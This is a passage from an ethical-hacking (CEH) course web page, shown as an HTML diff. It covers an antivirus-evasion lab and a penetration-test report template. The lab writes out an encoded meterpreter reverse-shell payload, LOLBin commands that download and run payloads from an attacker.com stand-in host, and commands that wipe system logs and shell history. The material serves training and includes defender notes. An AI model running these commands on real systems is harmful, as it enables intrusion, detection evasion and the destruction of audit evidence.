+    <p>Modern antivirus and EDR solutions detect payloads using three methods: <strong>signature-based</strong> (hash/pattern matching), <strong>heuristic</strong> (behavioral patterns), and <strong>behavioral</strong> (runtime monitoring). CEH tests your understanding of these techniques — and defenders must know them to build better detection rules.</p>
+  </div>
+
+  <div class="practical open">
+    <div class="prac-head" onclick="toggleP(this)">
+      <span class="ph-i">👻</span>
+      <span class="ph-t">Lab 12.1 — Payload Encoding with msfvenom and Evasion Techniques</span>
+      <span class="ph-tag pt-lab">Evasion Lab</span>
+      <span class="ph-chev">▶</span>
+    </div>
+    <div class="prac-body">
+      <div class="note red"><span class="ni">⚠</span><span>AV evasion techniques are presented for educational understanding. Only use against your own systems or explicitly authorized test environments.</span></div>
+      <ol class="steps" style="margin-top:14px;">
+        <li class="step">
+          <span class="sn">1</span>
+          <div class="sc">
+            <div class="st">Encode Payload with msfvenom (Basic Evasion)</div>
+            <div class="code" data-label="bash">
+<span class="cm"># Generate payload with encoder (x86/shikata_ga_nai = polymorphic)</span>
+<span class="cmd">msfvenom</span> <span class="flag">-p</span> windows/meterpreter/reverse_tcp \
+  LHOST=192.168.56.1 LPORT=4444 \
+  <span class="flag">-e</span> x86/shikata_ga_nai <span class="flag">-i</span> 10 \
+  <span class="flag">-f</span> exe <span class="flag">-o</span> encoded_payload.exe
+<span class="cm"># -e: encoder | -i: iterations (more = more obfuscated)</span>
+<span class="cm"># Note: shikata_ga_nai is well-known — modern AV still detects it</span>
+<span class="cm"># It demonstrates the CONCEPT of encoding for CEH exam purposes</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">2</span>
+          <div class="sc">
+            <div class="st">Check Detection Rate with VirusTotal (Before Deploying)</div>
+            <div class="code" data-label="bash">
+<span class="cmd">sha256sum</span> encoded_payload.exe
+<span class="cm"># Search hash on VirusTotal — see how many AV detect it</span>
+<span class="cm"># DO NOT upload actual payloads to VT — they're shared with AV vendors</span>
+<span class="cm"># Use hash-only search to check detection without sharing payload</span>
+<span class="cm"># 45/72 engines detect it → highly detected, poor evasion</span>
+<span class="cm"># 3/72 engines detect it → better evasion</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">3</span>
+          <div class="sc">
+            <div class="st">Living-Off-the-Land Binaries (LOLBins) — No Payload Needed</div>
+            <div class="code" data-label="windows cmd — concept">
+<span class="cm"># LOLBins: use legitimate Windows binaries for malicious purposes</span>
+<span class="cm"># These are pre-installed, signed by Microsoft — less likely to be flagged</span>
+
+<span class="cm"># certutil.exe — download files (legitimate cert tool)</span>
+certutil.exe <span class="flag">-urlcache -f</span> http://attacker.com/payload.exe payload.exe
+
+<span class="cm"># mshta.exe — execute HTA scripts remotely</span>
+mshta.exe http://attacker.com/payload.hta
+
+<span class="cm"># regsvr32.exe — scriptlet execution (squiblydoo technique)</span>
+regsvr32.exe /s /n /u /i:http://attacker.com/file.sct scrobj.dll
+
+<span class="cm"># powershell.exe — encoded command execution</span>
+powershell.exe <span class="flag">-enc</span> [BASE64_ENCODED_COMMAND]
+<span class="cm"># Defenders: Constrained Language Mode, ScriptBlock logging, AMSI</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">4</span>
+          <div class="sc">
+            <div class="st">Covering Tracks — Log Clearing (Lab Only)</div>
+            <div class="code" data-label="linux — root shell">
+<span class="cm"># Clear auth.log (your SSH login activity)</span>
+<span class="cmd">echo</span> "" > /var/log/auth.log
+<span class="cmd">echo</span> "" > /var/log/syslog
+
+<span class="cm"># More surgical: remove only your entries</span>
+<span class="cmd">sed -i</span> <span class="val">'/192.168.56.1/d'</span> /var/log/auth.log
+<span class="cm"># Removes all lines containing your Kali IP</span>
+
+<span class="cm"># Clear bash history (anti-forensics)</span>
+<span class="cmd">history -c</span>
+<span class="cmd">cat</span> /dev/null > ~/.bash_history
+
+<span class="cm"># Defenders: Immutable logs (chattr +i), remote syslog, Wazuh FIM</span>
+<span class="cm"># Critical detection note: Wazuh Rule 5710 fires when log file is cleared</span>
+            </div>
+          </div>
+        </li>
+      </ol>
+    </div>
+  </div>
+</div>
+
+<hr class="hdiv">
+
+<!-- ══════════════════
+13 — VAPT Report
+══════════════════ -->
+<div class="section" id="s13">
+  <div class="sec-head">
+    <span class="sec-num">13</span>
+    <div class="sec-meta">
+      <div class="sec-title">VAPT Report Writing</div>
+      <div class="sec-sub">Professional penetration test report — structure, finding template, and portfolio deliverable</div>
+    </div>
+    <span class="badge b-green">Capstone</span>
+  </div>
+
+  <div class="theory green">
+    <h4>The Report Is Your Final Deliverable</h4>
+    <p>A penetration test without a report is legally and professionally worthless. The report is what the client pays for — it communicates vulnerabilities, risk, and remediation in a format executives AND engineers can understand. <strong>A well-written VAPT report in your portfolio is stronger evidence of skill than the CEH certificate itself</strong> in most Indian hiring contexts.</p>
+  </div>
+
+  <div class="practical open">
+    <div class="prac-head" onclick="toggleP(this)">
+      <span class="ph-i">📄</span>
+      <span class="ph-t">Capstone — Write a Full VAPT Report for Your Metasploitable2 Lab</span>
+      <span class="ph-tag pt-report">Portfolio Deliverable</span>
+      <span class="ph-chev">▶</span>
+    </div>
+    <div class="prac-body">
+      <ol class="steps">
+        <li class="step">
+          <span class="sn">1</span>
+          <div class="sc">
+            <div class="st">Report Structure (Write One Section Per Day)</div>
+            <div class="code" data-label="vapt report outline">
+<span class="kw">═══════════════════════════════════════════════════</span>
+<span class="kw">VULNERABILITY ASSESSMENT & PENETRATION TEST REPORT</span>
+<span class="kw">Target: Metasploitable2 | Type: Black Box</span>
+<span class="kw">Analyst: [Your Name] | Date: [Date]</span>
+<span class="kw">Classification: CONFIDENTIAL</span>
+<span class="kw">═══════════════════════════════════════════════════</span>
+
+<span class="ok">1. EXECUTIVE SUMMARY (1 page)</span>
+   - What was tested, when, scope
+   - Total findings by severity (CRITICAL/HIGH/MEDIUM/LOW)
+   - Top 3 most critical findings in plain English
+   - Overall risk rating: CRITICAL
+   - Immediate actions required
+
+<span class="ok">2. SCOPE & METHODOLOGY</span>
+   - Target IP: 192.168.56.101
+   - Test type: Black box, internal network
+   - Testing window: [dates/hours]
+   - Tools used: Nmap, Metasploit, Enum4linux, Hydra
+   - Methodology: CEH 5-phase + PTES
+   - Exclusions: No DoS testing, no data exfiltration
+
+<span class="ok">3. FINDINGS TABLE (summary)</span>
+   ID | Title | Severity | CVSS | Service | Status
+
+<span class="ok">4. DETAILED FINDINGS (one per vulnerability)</span>
+   [Template on next step]
+
+<span class="ok">5. REMEDIATION ROADMAP</span>
+   Priority 1 (Immediate, 0-7 days): CRITICAL findings
+   Priority 2 (Short term, 7-30 days): HIGH findings
+   Priority 3 (Medium term, 30-90 days): MEDIUM findings
+
+<span class="ok">6. APPENDIX</span>
+   - Raw tool output
+   - Full Nmap scan results
+   - Screenshots of exploitation
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">2</span>
+          <div class="sc">
+            <div class="st">Individual Finding Template — Write for Each Vulnerability</div>
+            <div class="code" data-label="finding template">
+<span class="kw">Finding ID:</span>    VAPT-001
+<span class="kw">Title:</span>         vsftpd 2.3.4 Backdoor Command Execution
+<span class="kw">Severity:</span>      CRITICAL
+<span class="kw">CVSS v3.1:</span>     10.0 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
+<span class="kw">CVE:</span>           CVE-2011-2523
+<span class="kw">Service:</span>       FTP — Port 21/TCP
+<span class="kw">Host:</span>          192.168.56.101
+
+<span class="kw">Description:</span>
+vsftpd version 2.3.4 contains a backdoor introduced in the source
+distribution package. When an FTP username containing ":)" is sent,
+the service opens a root shell on port 6200 without authentication.
+
+<span class="kw">Evidence:</span>
+[Screenshot 1: nmap showing vsftpd 2.3.4]
+[Screenshot 2: netcat connection trigger]
+[Screenshot 3: id command showing uid=0(root)]
+
+<span class="kw">Business Impact:</span>
+An unauthenticated remote attacker can obtain complete root (superuser)
+access to this server. This allows full system compromise including:
+theft of all data, installation of malware, use of system in further
+attacks, and complete loss of confidentiality/integrity/availability.
+
+<span class="kw">Remediation:</span>
+1. Immediate: Disable FTP service if not required
+2. If FTP required: Upgrade to vsftpd 3.0.5+
+3. Replace FTP with SFTP (SSH File Transfer Protocol)
+4. Restrict FTP access to specific IP addresses via firewall
+5. Review all files on server for signs of prior compromise
+
+<span class="kw">References:</span>
+- CVE-2011-2523: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
+- vsftpd official site: https://security.appspot.com/vsftpd.html
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">3</span>
+          <div class="sc">
+            <div class="st">Write Findings for All 5 Metasploitable2 Vulnerabilities</div>
+            <div class="code" data-label="metasploitable2 findings list">
+<span class="hi">VAPT-001</span> | vsftpd 2.3.4 Backdoor          | CRITICAL | CVE-2011-2523
+<span class="hi">VAPT-002</span> | UnrealIRCd Backdoor            | CRITICAL | CVE-2010-2075
+<span class="hi">VAPT-003</span> | Samba MS-RPC Shell             | CRITICAL | CVE-2007-2447
+<span class="warn">VAPT-004</span> | MySQL Root - No Password       | HIGH     | CWE-521
+<span class="warn">VAPT-005</span> | Telnet Service Enabled         | HIGH     | CWE-319
+<span class="warn">VAPT-006</span> | VNC - No Auth (Port 5900)      | HIGH     | CWE-306
+<span class="ok">VAPT-007</span> | SNMP Default Community String  | MEDIUM   | CWE-1188
+<span class="ok">VAPT-008</span> | Apache httpd 2.2.8 (Outdated)  | MEDIUM   | multiple CVEs
+<span class="ok">VAPT-009</span> | PHP CGI Argument Injection      | HIGH     | CVE-2012-1823
+<span class="ok">VAPT-010</span> | DVWA SQL Injection             | HIGH     | CWE-89
+            </div>
+          </div>
+        </li>
+      </ol>
+    </div>
+  </div>
+
+  <!-- Module completion checklist -->
+  <div class="theory" style="margin-top:20px;border-left-color:var(--green);">
+    <h4>Module Completion Checklist</h4>
+    <ul class="checklist">
+      <li onclick="toggleCheck(this)"><span class="cb"></span><span>Lab 2.1 — Completed full passive recon: WHOIS, DNS, subdomains, theHarvester, Shodan, Google dorks</span></li>
+      <li onclick="toggleCheck(this)"><span class="cb"></span><span>Lab 3.1 — Nmap full workflow: ping scan → SYN scan → service detection → OS fingerprint → NSE scripts → SMB enum</span></li>
+      <li onclick="toggleCheck(this)"><span class="cb"></span><span>Lab 4.1 — Exploited vsftpd 2.3.4 backdoor manually via netcat</span></li>
+      <li onclick="toggleCheck(this)"><span class="cb"></span><span>Lab 4.2 — Understood EternalBlue (MS17-010) — CVE, attack surface, prevention</span></li>
+      <li onclick="toggleCheck(this)"><span class="cb"></span><span>Lab 5.1 — Cracked MD5 hashes with Hashcat, cracked /etc/shadow with John, ran Hydra SSH brute force</span></li>
+      <li onclick="toggleCheck(this)"><span class="cb"></span><span>Lab 6.1 — Full Metasploit workflow: workspace, db_import, search, exploit, Meterpreter, msfvenom</span></li>
+      <li onclick="toggleCheck(this)"><span class="cb"></span><span>Lab 7.1 — Manual SQLi (UNION-based) and automated sqlmap dump on DVWA</span></li>
+      <li onclick="toggleCheck(this)"><span class="cb"></span><span>Lab 7.2 — Stored and Reflected XSS with cookie theft payload on DVWA</span></li>
+      <li onclick="toggleCheck(this)"><span class="cb"></span><span>Lab 8.1 — Linux privesc: LinPEAS scan, SUID abuse, sudo misconfiguration, cron hijacking</span></li>
+      <li onclick="toggleCheck(this)"><span class="cb"></span><span>Lab 9.1 — Established SSH backdoor key and cron reverse shell, then cleaned up</span></li>
+      <li onclick="toggleCheck(this)"><span class="cb"></span><span>Lab 10.1 — Credential dump (/etc/shadow), Pass-the-Hash with CrackMapExec, Meterpreter pivoting</span></li>
+      <li onclick="toggleCheck(this)"><span class="cb"></span><span>Lab 11.1 — GoPhish phishing campaign: SMTP, template, landing page, results analysis</span></li>
+      <li onclick="toggleCheck(this)"><span class="cb"></span><span>Capstone — Wrote full VAPT report (10 findings, executive summary, remediation roadmap) — pushed to GitHub</span></li>
+    </ul>
+  </div>
+
+  <div class="note green" style="margin-top:14px;">
+    <span class="ni">🏆</span>
+    <span><strong>Portfolio package for ethical hacking / VAPT roles:</strong> GitHub repo with (1) Recon report (OSINT findings), (2) Nmap scan results, (3) Screenshots of exploits with CVE references, (4) Full VAPT report PDF (10+ findings, CVSS scores, remediation steps). This level of practical evidence is what EC-Council trained VAPT consultants at Wipro, TCS Red Team, Deloitte Advisory, and KPMG expect from junior hires.</span>
+  </div>
+
+</div>
+
+</div><!-- /content -->
+</main>
+</div><!-- /layout -->
+
+<script>
+function toggleP(header) {
+  header.closest('.practical').classList.toggle('open');
+  updateProgress();
+}
+
+function toggleCheck(li) {
+  li.classList.toggle('done');
+  updateProgress();
+}
+
+function updateProgress() {
+  const all = document.querySelectorAll('.checklist li');
+  const done = document.querySelectorAll('.checklist li.done');
+  const pct = all.length > 0 ? Math.round((done.length / all.length) * 100) : 0;
+  document.getElementById('sb-fill').style.width = pct + '%';
+  document.getElementById('sb-pct').textContent = pct + '%';
+}
+
+// Sidebar active tracking
+const sections = document.querySelectorAll('.section');
+const navItems = document.querySelectorAll('.nav-item');
+
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach(entry => {
+    if (entry.isIntersecting) {
+      const id = entry.target.id;
+      navItems.forEach(item => {
+        item.classList.toggle('active', item.getAttribute('href') === '#' + id);
+      });
+    }
+  });
+}, { rootMargin: '-20% 0px -70% 0px' });
+
+sections.forEach(s => observer.observe(s));
+
+navItems.forEach(item => {
+  item.addEventListener('click', e => {
+    const href = item.getAttribute('href');
+    if (href && href.startsWith('#')) {
+      e.preventDefault();
+      document.querySelector(href)?.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    }
+  });
+});
+
+updateProgress();
+</script>
+</body>
+</html>
